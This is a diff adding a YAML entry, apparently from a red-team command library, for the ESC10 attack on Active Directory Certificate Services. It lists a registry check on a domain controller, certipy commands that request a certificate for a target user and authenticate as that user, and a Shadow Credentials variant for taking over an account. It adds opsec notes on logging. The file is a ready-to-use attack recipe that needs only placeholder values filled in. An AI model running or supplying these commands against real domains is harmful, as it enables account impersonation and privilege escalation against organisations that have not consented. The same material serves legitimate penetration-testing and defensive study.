@@ -1,0 +1,24 @@
+name: ADCSESC10
+description: ESC10 - Weak certificate mapping (StrongCertificateBindingEnforcement < 2)
+commands:
+- '# ESC10 exploits weak certificate-to-account mapping'
+- '# Requires: StrongCertificateBindingEnforcement = 0 or 1'
+- ''
+- '# Check registry setting on DC'
+- 'reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement'
+- ''
+- '# Method A: If GenericWrite on target user'
+- '# Step 1: Request certificate for target'
+- certipy req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>'
+- ''
+- '# Step 2: If mapping is weak, certificate can authenticate as user'
+- certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
+- ''
+- '# Method B: Shadow Credentials approach (ESC10 variant)'
+- '# Add KeyCredential to target, request cert, authenticate'
+- certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET_USER>'
+opsec:
+- Registry checks may require local admin
+- Certificate authentication events are logged
+references:
+- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88f2c
